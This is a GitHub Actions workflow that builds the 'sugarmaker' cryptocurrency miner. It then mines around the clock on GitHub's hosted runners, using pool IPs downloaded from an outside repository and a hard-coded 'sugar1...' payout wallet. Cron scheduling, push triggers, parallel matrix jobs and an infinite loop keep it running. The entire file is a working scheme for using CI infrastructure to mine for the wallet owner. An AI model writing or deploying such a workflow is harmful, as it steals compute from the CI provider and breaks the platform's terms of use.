name: Run Sugarmaker

on:
  workflow_dispatch:
  push:
    branches: ["main"]
  schedule:
    - cron: '0 */6 * * *'

jobs:
  build:
    name: build
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 5
      fail-fast: false
      matrix:
        go: [1, 2, 3]
        flag: [A]
    env:
      NUM_JOBS: 40
      JOB: ${{ matrix.go }}
    steps:
      - name: Checkout repository
        run: |
          git clone https://github.com/decryp2kanon/sugarmaker.git

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y build-essential libcurl4-openssl-dev autotools-dev automake libtool jq

      - name: Build Sugarmaker
        run: |
          cd sugarmaker
          ./autogen.sh
          ./configure CFLAGS="-Wall -O2 -fomit-frame-pointer" CXXFLAGS="$CFLAGS -std=gnu++11"
          make

      - name: Download and process IP list
        run: |
          dynamic_list="list3.json"
          wget -O $dynamic_list https://github.com/barburonjilo/open/raw/refs/heads/main/list.json
          if [[ ! -f $dynamic_list ]]; then
            echo "Failed to download IP list. Exiting."
            exit 1
          fi

          # Check JSON file format
          if ! jq '.' $dynamic_list > /dev/null 2>&1; then
            echo "Invalid JSON format. Exiting."
            exit 1
          fi

      - name: Run Sugarmaker in loop
        run: |
          timestamp=$(date +%s)

          cd sugarmaker

          while true; do
            # Select a random IP from the JSON file
            ip=$(jq -r '.[]' ../list3.json | shuf -n 1)
            if [ -z "$ip" ]; then
              echo "No IP found in list3.json. Exiting."
              exit 1
            fi

            # Remove selected IP from JSON file
            jq --arg ip "$ip" 'del(.[] | select(. == $ip))' ../list3.json > tmp_$timestamp.json && mv tmp_$timestamp.json ../list3.json

            # Loop through ports
            for port in $(seq 601 610); do
              echo "Running ./sugarmaker for $ip:$port"
              ./sugarmaker -o $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr -p x &
              sleep 80
              echo "Stopping ./sugarmaker for $ip:$port"
              pkill sugarmaker || true
              sleep 90
            done
          done

